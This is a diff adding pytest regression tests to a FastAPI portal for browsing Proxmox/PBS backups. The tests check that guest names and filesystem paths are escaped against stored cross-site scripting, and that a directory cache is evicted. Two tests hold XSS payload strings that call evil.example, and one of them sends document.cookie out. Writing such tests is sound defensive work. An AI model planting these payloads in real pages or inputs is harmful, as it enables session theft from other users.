@@ -18,7 +18,7 @@ import pytest
 main = pytest.importorskip("backend.main", reason="backend.main needs FastAPI")
 from fastapi.testclient import TestClient
 
-from backend import auth, pve_client
+from backend import auth, dir_cache, pve_client
 
 ARCHIVES = [
     {"volid": "pbs:backup/vm/133/2026-08-30T02:03:57Z", "ctime": 200, "size": 10, "verification": {"state": "ok"}},
@@ -73,6 +73,50 @@ def test_index_renders_version_and_repo_link_in_about_box(client, project_root):
     assert REPO_URL in body
 
 
+def test_index_escapes_guest_name_containing_script_close_tag(session_data, monkeypatch):
+    """A PVE user needs only VM.Config.Options (far below file-restore/PBS
+    access) to rename a guest. json.dumps() doesn't escape "<", so a name
+    containing a literal "</script>" would close the `<script
+    id="groups-data">` block early and let attacker-supplied markup run in
+    every other portal user's session (stored XSS) unless "<" is escaped
+    before the JSON is embedded with `|safe`."""
+    payload = "</script><script>fetch('https://evil.example/steal')</script>"
+
+    async def fake_archives(session):
+        return pve_client.BackupListing(archives=list(ARCHIVES))
+
+    async def fake_names(session):
+        return {"133": payload}
+
+    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
+    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
+    main.app.dependency_overrides[auth.get_session] = lambda: session_data
+    try:
+        with TestClient(main.app) as c:
+            resp = c.get("/", params={"task": "vm:133"})
+    finally:
+        main.app.dependency_overrides.clear()
+    assert resp.status_code == 200
+    assert "</script><script>fetch" not in resp.text
+    assert "\\u003c/script>\\u003cscript>fetch" in resp.text
+
+
+def test_index_reads_task_and_identity_from_dataset_not_inline_js(client):
+    """taskPicker(...) and userMenu(...) used to splice guest_type/guest_vmid
+    and the current PVE username directly into a single-quoted JS string
+    inside x-data (same escaping-context bug as tree_nodes.html's
+    trackTreeToggle - Jinja's HTML-attribute escaping doesn't protect an
+    attribute the browser HTML-decodes before Alpine evaluates it as JS).
+    Both must now read the value back out of the element's own dataset."""
+    resp = client.get("/")
+    assert resp.status_code == 200
+    body = resp.text
+    assert "taskPicker(JSON.parse(document.getElementById('groups-data').textContent), $el.dataset.task)" in body
+    assert "userMenu($el.dataset.identity)" in body
+    assert "taskPicker(JSON.parse(document.getElementById('groups-data').textContent), 'ct:104')" not in body
+    assert "userMenu('alice@pam')" not in body
+
+
 def test_index_shows_a_banner_and_still_renders_when_a_storage_is_inaccessible(session_data, monkeypatch):
     async def fake_archives(session):
         return pve_client.BackupListing(
@@ -93,6 +137,51 @@ def test_index_shows_a_banner_and_still_renders_when_a_storage_is_inaccessible(s
     assert resp.status_code == 200
     assert "pbs-tier1-external" in resp.text
     assert "could not be read" in resp.text
+
+
+def test_index_evicts_dir_cache_entries_for_volumes_no_longer_listed(client, session_data):
+    """Issue #109 follow-up: a snapshot pruned by PBS retention, or a
+    user's revoked access to one, must not leave its dir_cache rows
+    behind forever - reconciled against this same request's own live
+    archive list on every normal page load."""
+    asyncio.run(dir_cache.set(session_data.username, "pbs:backup/vm/999/2020-01-01T00:00:00Z", "/", [{"text": "x"}]))
+    asyncio.run(
+        dir_cache.set(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/", [{"text": "kept"}])
+    )
+    resp = client.get("/")
+    assert resp.status_code == 200
+    assert asyncio.run(dir_cache.get(session_data.username, "pbs:backup/vm/999/2020-01-01T00:00:00Z", "/")) is None
+    assert asyncio.run(
+        dir_cache.get(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/")
+    ) == [{"text": "kept"}]
+
+
+def test_index_skips_dir_cache_eviction_when_a_storage_errored(session_data, monkeypatch):
+    """A transient PVE hiccup on one storage must never look like
+    "nothing exists anymore" and wipe good cache entries from the
+    storages that did answer."""
+    asyncio.run(dir_cache.set(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/", [{"text": "x"}]))
+
+    async def fake_archives(session):
+        return pve_client.BackupListing(
+            archives=[], errors=[pve_client.StorageError("pbs-tier1-external", "permission denied")]
+        )
+
+    async def fake_names(session):
+        return {}
+
+    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
+    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
+    main.app.dependency_overrides[auth.get_session] = lambda: session_data
+    try:
+        with TestClient(main.app) as c:
+            resp = c.get("/")
+    finally:
+        main.app.dependency_overrides.clear()
+    assert resp.status_code == 200
+    assert asyncio.run(
+        dir_cache.get(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/")
+    ) == [{"text": "x"}]
 
 
 def test_index_requires_auth():
@@ -644,6 +733,34 @@ def test_tree_sorts_subdirectories_alphabetically(client, monkeypatch):
     assert [resp.text.index(name) for name in ("bin", "Etc", "var")] == sorted(
         resp.text.index(name) for name in ("bin", "Etc", "var")
     )
+
+
+def test_tree_filepath_is_not_interpolated_into_inline_js(client, monkeypatch):
+    """A guest filesystem entry's name/filepath is attacker-controlled by
+    anyone with plain write access inside the guest - far below the
+    portal/PBS privilege of whoever later browses the backup. Filepaths
+    must never be spliced into an inline JS string literal (Jinja's
+    HTML-attribute escaping doesn't protect that context: the browser
+    HTML-decodes the attribute before the JS parser sees it), only into
+    a `data-*` attribute that JS reads back via `.dataset`."""
+    payload = "x'); fetch('https://evil.example/steal?c='+document.cookie); //"
+
+    async def fake_list_path(session, volume, filepath="/"):
+        return [{"text": "dir", "leaf": False, "filepath": payload}]
+
+    monkeypatch.setattr(pve_client, "list_path", fake_list_path)
+    resp = client.get("/api/tree", params={"volume": "vol", "filepath": "/", "crumbs": "[]"})
+    assert resp.status_code == 200
+    body = resp.text
+    # The @click handler must read the filepath back out of the element's
+    # dataset rather than have it spliced into the handler's JS source as a
+    # string literal - Jinja's HTML-entity escaping (which still applies to
+    # the data-filepath="..." attribute below) does not protect an inline
+    # event-handler attribute, since the browser HTML-decodes it before the
+    # JS parser ever sees it.
+    assert "trackTreeToggle($el.dataset.filepath, open)" in body
+    assert "trackTreeToggle('" not in body
+    assert 'data-filepath="' in body
 
 
 def test_restore_capabilities_rejects_unknown_guest_type(client):
